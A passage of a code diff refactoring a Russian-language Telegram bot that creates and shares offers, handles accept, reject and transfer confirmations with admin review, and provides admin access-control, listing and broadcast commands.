+    lang = callback.data.split(":", 1)[1]
+
+    if lang not in LANGUAGES:
+        await callback.answer()
         return
 
-    await state.update_data(offer_language=code)
-    uid = cb.from_user.id
-
     data = await state.get_data()
-    oid = gen_id()
+
+    oid = make_id()
     offer = {
         "id": oid,
         "creator_id": uid,
-        "creator_username": cb.from_user.username or str(uid),
+        "creator_username": callback.from_user.username or str(uid),
         "recipient": data["recipient"],
         "link": data["link"],
         "currency": data["currency"],
         "amount": data["amount"],
-        "offer_language": code,
+        "offer_language": lang,
         "status": "pending",
         "accepted_by": None,
     }
     offers[oid] = offer
 
-    recipient = data["recipient"].lstrip("@").lower()
-    rid = username_to_id.get(recipient)
+    normalized = offer["recipient"].lower().lstrip("@")
+    recipient_id = username_to_id.get(normalized)
 
-    if rid:
+    if recipient_id:
         try:
             await bot.send_message(
-                rid,
-                e(offer_text(oid, code)),
-                reply_markup=offer_actions_kb(oid, code)
+                recipient_id,
+                e(
+                    tr(
+                        lang,
+                        "deal_instructions",
+                        trade_id=oid,
+                        amount=offer["amount"],
+                        currency=currency_name(offer["currency"], lang),
+                        recipient=offer["recipient"].lstrip("@"),
+                        link=offer["link"],
+                    )
+                ),
+                reply_markup=offer_actions_kb(oid, lang)
             )
         except Exception:
-            pending_offers.setdefault(recipient, []).append(oid)
+            pending_offers.setdefault(normalized, []).append(oid)
     else:
-        pending_offers.setdefault(recipient, []).append(oid)
+        pending_offers.setdefault(normalized, []).append(oid)
 
     await state.clear()
 
-    await cb.message.edit_text(
-        e(t(uid, "offer_created")),
+    await callback.message.edit_text(
+        e(tr(get_lang(uid), "offer_created")),
         reply_markup=share_kb(oid)
     )
-    await cb.answer()
+    await callback.answer()
 
 
-@dp.callback_query(F.data == "settings")
-async def cb_settings(cb: CallbackQuery):
-    uid = cb.from_user.id
-    await cb.message.edit_text(
-        t(uid, "choose_language"),
-        reply_markup=language_kb(include_back=True, uid=uid)
-    )
-    await cb.answer()
-
-
-@dp.callback_query(F.data == "create_offer")
-async def cb_create_offer(cb: CallbackQuery, state: FSMContext):
-    uid = cb.from_user.id
-
-    if uid not in ADMINS:
-        uname = (cb.from_user.username or "").lower()
-        if uname not in verified_handles:
-            await cb.answer(t(uid, "verify_required"), show_alert=True)
-            for admin_id in ADMINS:
-                try:
-                    await bot.send_message(
-                        admin_id,
-                        f"Пользователь @{cb.from_user.username or uid} "
-                        f"(ID: {uid}) запрашивает доступ к созданию офферов."
-                    )
-                except Exception:
-                    pass
-            return
-
-    await state.set_state(OfferFlow.username)
-    await cb.message.edit_text(
-        e(t(uid, "t_username")),
-        reply_markup=back_kb(uid, "main")
-    )
-    await cb.answer()
-
-
-@dp.callback_query(F.data == "exit_main")
-async def cb_exit(cb: CallbackQuery, state: FSMContext):
-    await state.clear()
-    try:
-        await cb.message.delete()
-    except Exception:
-        pass
-    await cb.answer()
-
-
-@dp.callback_query(F.data.startswith("back:"))
-async def cb_back(cb: CallbackQuery, state: FSMContext):
-    uid = cb.from_user.id
-    target = cb.data.split(":", 1)[1]
-
-    if target == "main":
-        await state.clear()
-        await cb.message.edit_text(
-            e(t(uid, "welcome")),
-            reply_markup=main_menu_kb(uid)
-        )
-    elif target == "username":
-        await state.set_state(OfferFlow.username)
-        await cb.message.edit_text(
-            e(t(uid, "t_username")),
-            reply_markup=back_kb(uid, "main")
-        )
-    elif target == "link":
-        await state.set_state(OfferFlow.link)
-        await cb.message.edit_text(
-            e(t(uid, "t_link")),
-            reply_markup=back_kb(uid, "username")
-        )
-    elif target == "currency":
-        await state.set_state(OfferFlow.currency)
-        await cb.message.edit_text(
-            e(t(uid, "t_currency")),
-            reply_markup=currency_kb(uid)
-        )
-    await cb.answer()
-
-
-@dp.message(OfferFlow.username)
-async def msg_username(message: Message, state: FSMContext):
-    txt = (message.text or "").strip()
-    uid = message.from_user.id
-
-    if not txt.startswith("@") or len(txt) < 2:
-        await message.answer(t(uid, "invalid_username"))
-        return
-
-    await state.update_data(recipient=txt)
-    await state.set_state(OfferFlow.link)
-    await message.answer(
-        e(t(uid, "t_link")),
-        reply_markup=back_kb(uid, "username")
-    )
-
-
-@dp.message(OfferFlow.link)
-async def msg_link(message: Message, state: FSMContext):
-    uid = message.from_user.id
-    await state.update_data(link=(message.text or "").strip())
-    await state.set_state(OfferFlow.currency)
-    await message.answer(
-        e(t(uid, "t_currency")),
-        reply_markup=currency_kb(uid)
-    )
-
-
-@dp.callback_query(F.data.startswith("cur:"))
-async def cb_currency(cb: CallbackQuery, state: FSMContext):
-    uid = cb.from_user.id
-    currency = cb.data.split(":", 1)[1]
-
-    await state.update_data(currency=currency)
-    await state.set_state(OfferFlow.amount)
-    await cb.message.edit_text(
-        e(t(uid, "t_amount")),
-        reply_markup=back_kb(uid, "currency")
-    )
-    await cb.answer()
-
-
-@dp.message(OfferFlow.amount)
-async def msg_amount(message: Message, state: FSMContext):
-    uid = message.from_user.id
-    txt = (message.text or "").strip()
-
-    if not txt.isdigit():
-        await message.answer(t(uid, "invalid_amount"))
-        return
-
-    await state.update_data(amount=int(txt))
-    await state.set_state(OfferFlow.offer_language)
-
-    await message.answer(
-        e(t(uid, "t_offer_language")),
-        reply_markup=language_kb(prefix="offerlang")
-    )
-
+# =========================================================
+# SHARE OFFER THROUGH TELEGRAM INLINE MODE
+# =========================================================
 
 @dp.inline_query()
-async def inline_share(inline_query: InlineQuery):
-    query = (inline_query.query or "").strip()
+async def inline_share(query: InlineQuery):
+    search = (query.query or "").strip()
 
-    if not query.startswith("offer_"):
-        await inline_query.answer([], cache_time=1, is_personal=True)
+    if not search.startswith("offer_"):
+        await query.answer([], cache_time=1, is_personal=True)
         return
 
-    oid = query[6:]
-    o = offers.get(oid)
+    oid = search[len("offer_"):]
+    offer = offers.get(oid)
 
-    if not o or o["status"] != "pending":
-        await inline_query.answer([], cache_time=1, is_personal=True)
+    if not offer or offer["status"] != "pending":
+        await query.answer([], cache_time=1, is_personal=True)
         return
 
-    lang = o["offer_language"]
+    lang = offer["offer_language"]
 
     result = InlineQueryResultArticle(
         id=oid,
-        title=TEXTS[lang]["inline_title"].format(oid=oid),
-        description=TEXTS[lang]["inline_description"],
+        title=tr(lang, "inline_title", oid=oid),
+        description=tr(lang, "inline_description"),
         input_message_content=InputTextMessageContent(
-            message_text=e(offer_text(oid, lang)),
+            message_text=e(
+                tr(
+                    lang,
+                    "deal_instructions",
+                    trade_id=oid,
+                    amount=offer["amount"],
+                    currency=currency_name(offer["currency"], lang),
+                    recipient=offer["recipient"].lstrip("@"),
+                    link=offer["link"],
+                )
+            ),
             parse_mode=ParseMode.HTML
         ),
         reply_markup=offer_actions_kb(oid, lang)
     )
 
-    await inline_query.answer(
-        [result],
-        cache_time=1,
-        is_personal=True
-    )
+    await query.answer([result], cache_time=1, is_personal=True)
 
+
+# =========================================================
+# ACCEPT / REJECT
+# =========================================================
 
 @dp.callback_query(F.data.startswith("reject:"))
-async def cb_reject(cb: CallbackQuery):
-    oid = cb.data.split(":", 1)[1]
-    o = offers.get(oid)
+async def reject_offer(callback: CallbackQuery):
+    oid = callback.data.split(":", 1)[1]
+    offer = offers.get(oid)
 
-    if not o or o["status"] != "pending":
-        await cb.answer()
+    if not offer or offer["status"] != "pending":
+        lang = get_lang(callback.from_user.id)
+        await callback.answer(tr(lang, "already_processed"), show_alert=True)
         return
 
-    if cb.from_user.id == o["creator_id"]:
-        await cb.answer(t(cb.from_user.id, "not_yours"), show_alert=True)
+    if callback.from_user.id == offer["creator_id"]:
+        await callback.answer(
+            tr(get_lang(callback.from_user.id), "not_recipient"),
+            show_alert=True
+        )
         return
 
-    o["status"] = "rejected"
+    offer["status"] = "rejected"
 
     try:
-        await cb.message.edit_reply_markup(reply_markup=None)
+        await callback.message.edit_reply_markup(reply_markup=None)
     except Exception:
         pass
 
-    await cb.answer()
+    await callback.answer(tr(offer["offer_language"], "offer_rejected"))
 
 
 @dp.callback_query(F.data.startswith("accept:"))
-async def cb_accept(cb: CallbackQuery):
-    oid = cb.data.split(":", 1)[1]
-    o = offers.get(oid)
+async def accept_offer(callback: CallbackQuery):
+    oid = callback.data.split(":", 1)[1]
+    offer = offers.get(oid)
 
-    if not o or o["status"] != "pending":
-        await cb.answer()
+    if not offer or offer["status"] != "pending":
+        await callback.answer(
+            tr(get_lang(callback.from_user.id), "already_processed"),
+            show_alert=True
+        )
         return
 
-    if cb.from_user.id == o["creator_id"]:
-        await cb.answer(t(cb.from_user.id, "not_yours"), show_alert=True)
+    if callback.from_user.id == offer["creator_id"]:
+        await callback.answer(
+            tr(get_lang(callback.from_user.id), "not_recipient"),
+            show_alert=True
+        )
         return
 
-    o["status"] = "accepted"
-    o["accepted_by"] = cb.from_user.id
-    lang = o["offer_language"]
+    offer["status"] = "accepted"
+    offer["accepted_by"] = callback.from_user.id
 
-    await cb.answer(TEXTS[lang]["accept_alert"], show_alert=True)
+    lang = offer["offer_language"]
 
-    trade_id = gen_id()
-    text = TEXTS[lang]["trade_text"].format(
-        trade_id=trade_id,
-        amount=o["amount"],
-        currency=o["currency"],
-        creator=o["creator_username"],
-        link=o["link"]
+    instructions = tr(
+        lang,
+        "deal_instructions",
+        trade_id=oid,
+        amount=offer["amount"],
+        currency=currency_name(offer["currency"], lang),
+        recipient=offer["recipient"].lstrip("@"),
+        link=offer["link"],
     )
 
-    kb = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text=TEXTS[lang]["btn_transfer"],
-            callback_data=f"transfer:{oid}",
-            icon_custom_emoji_id=EMOJI_MAP["✅"]
-        )
-    ]])
+    await callback.message.edit_text(
+        e(instructions),
+        reply_markup=transfer_kb(oid, lang)
+    )
+    await callback.answer()
 
-    await cb.message.edit_text(e(text), reply_markup=kb)
 
+# =========================================================
+# TRANSFER CONFIRMATION -> ADMIN REVIEW
+# =========================================================
 
 @dp.callback_query(F.data.startswith("transfer:"))
-async def cb_transfer(cb: CallbackQuery):
-    oid = cb.data.split(":", 1)[1]
-    o = offers.get(oid)
+async def transfer_confirm(callback: CallbackQuery):
+    oid = callback.data.split(":", 1)[1]
+    offer = offers.get(oid)
 
-    if not o or o["status"] != "accepted":
-        await cb.answer()
+    if not offer or offer["status"] != "accepted":
+        await callback.answer(
+            tr(get_lang(callback.from_user.id), "already_processed"),
+            show_alert=True
+        )
         return
 
-    if cb.from_user.id != o["accepted_by"]:
-        await cb.answer(TEXTS[o["offer_language"]]["not_yours"], show_alert=True)
+    if callback.from_user.id != offer["accepted_by"]:
+        await callback.answer(
+            tr(get_lang(callback.from_user.id), "not_recipient"),
+            show_alert=True
+        )
         return
 
-    o["status"] = "completed"
-    lang = o["offer_language"]
+    lang = offer["offer_language"]
+    offer["status"] = "review"
 
-    await cb.message.edit_text(e(TEXTS[lang]["transfer_done"]))
-    await cb.answer()
+    review_text = tr(
+        lang,
+        "admin_review",
+        trade_id=oid,
+        creator=offer["creator_username"],
+        recipient=offer["recipient"].lstrip("@"),
+        amount=offer["amount"],
+        currency=currency_name(offer["currency"], lang),
+        link=offer["link"],
+        user=callback.from_user.username or callback.from_user.full_name,
+        user_id=callback.from_user.id,
+    )
 
+    sent_to_admin = False
+
+    for admin_id in ADMINS:
+        try:
+            await bot.send_message(admin_id, e(review_text))
+            sent_to_admin = True
+        except Exception:
+            pass
+
+    try:
+        await callback.message.edit_text(e(tr(lang, "submitted")))
+    except Exception:
+        await callback.message.answer(e(tr(lang, "submitted")))
+
+    if not sent_to_admin:
+        await callback.answer(tr(lang, "no_admins"), show_alert=True)
+    else:
+        await callback.answer(tr(lang, "admin_received"))
+
+
+# =========================================================
+# ADMIN COMMANDS
+# =========================================================
 
 @dp.message(Command("dostup"))
-async def cmd_dostup(message: Message):
+async def grant_access(message: Message):
     if message.from_user.id not in ADMINS:
         return
-    parts = message.text.split(maxsplit=1)
-    if len(parts) < 2:
+
+    parts = (message.text or "").split(maxsplit=1)
+
+    if len(parts) != 2:
         await message.answer("Использование: /dostup @username")
         return
-    uname = parts[1].strip().lstrip("@").lower()
-    verified_handles.add(uname)
-    await message.answer(f"Доступ выдан @{uname}")
+
+    username = parts[1].strip().lstrip("@").lower()
+    verified_handles.add(username)
+
+    await message.answer(f"Доступ выдан @{username}")
 
 
 @dp.message(Command("undostup"))
-async def cmd_undostup(message: Message):
+async def revoke_access(message: Message):
     if message.from_user.id not in ADMINS:
         return
-    parts = message.text.split(maxsplit=1)
-    if len(parts) < 2:
+
+    parts = (message.text or "").split(maxsplit=1)
+
+    if len(parts) != 2:
         await message.answer("Использование: /undostup @username")
         return
-    uname = parts[1].strip().lstrip("@").lower()
-    verified_handles.discard(uname)
-    await message.answer(f"Доступ снят с @{uname}")
+
+    username = parts[1].strip().lstrip("@").lower()
+    verified_handles.discard(username)
+
+    await message.answer(f"Доступ снят с @{username}")
+
+
+@dp.message(Command("offers"))
+async def list_offers(message: Message):
+    if message.from_user.id not in ADMINS:
+        return
+
+    if not offers:
+        await message.answer("Офферов пока нет.")
+        return
+
+    lines = ["Офферы:"]
+
+    for oid, offer in offers.items():
+        lines.append(
+            f"{oid} | {offer['status']} | "
+            f"{offer['amount']} "
+            f"{currency_name(offer['currency'], offer['offer_language'])} | "
+            f"@{offer['recipient'].lstrip('@')}"
+        )
+
+    await message.answer("\n".join(lines), parse_mode=None)
 
 
 @dp.message(Command("m"))
-async def cmd_m(message: Message):
+async def broadcast(message: Message):
     if message.from_user.id not in ADMINS:
         return
-    parts = message.text.split(maxsplit=1)
-    if len(parts) < 2:
+
+    parts = (message.text or "").split(maxsplit=1)
+
+    if len(parts) != 2:
         await message.answer("Использование: /m текст")
         return
+
     sent = 0
+
     for uid in list(started_users):
         try:
             await bot.send_message(uid, parts[1], parse_mode=None)
             sent += 1
         except Exception:
             pass
+
     await message.answer(f"Отправлено: {sent}")
 
 
-@dp.message(Command("offers"))
-async def cmd_offers(message: Message):
-    if message.from_user.id not in ADMINS:
-        return
-    active = {
-        k: v for k, v in offers.items()
-        if v["status"] in {"pending", "accepted"}
-    }
-    if not active:
-        await message.answer("Активных офферов нет")
-        return
-    lines = ["Активные офферы:"]
-    for oid, o in active.items():
-        lines.append(
-            f"#{oid} | @{o['creator_username']} → "
-            f"{o['recipient']} | {o['amount']} {o['currency']}"
-        )
-    await message.answer("\n".join(lines))
-
+# =========================================================
+# TRACK USERS
+# =========================================================
 
 @dp.message()
 async def track_user(message: Message):
     if message.from_user and message.from_user.username:
-        username_to_id[message.from_user.username.lower()] = message.from_user.id
-
-
-async def main():
-    if not BOT_TOKEN or ":" not in BOT_TOKEN:
-        raise RuntimeError(
-            "BOT_TOKEN не задан. Установите переменную окружения BOT_TOKEN."
+        username_to_id[message.from_user.username.lower()] = (
+            message.from_user.id
         )
 
+
+# =========================================================
+# START
+# =========================================================
+
+async def main():
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot)
 
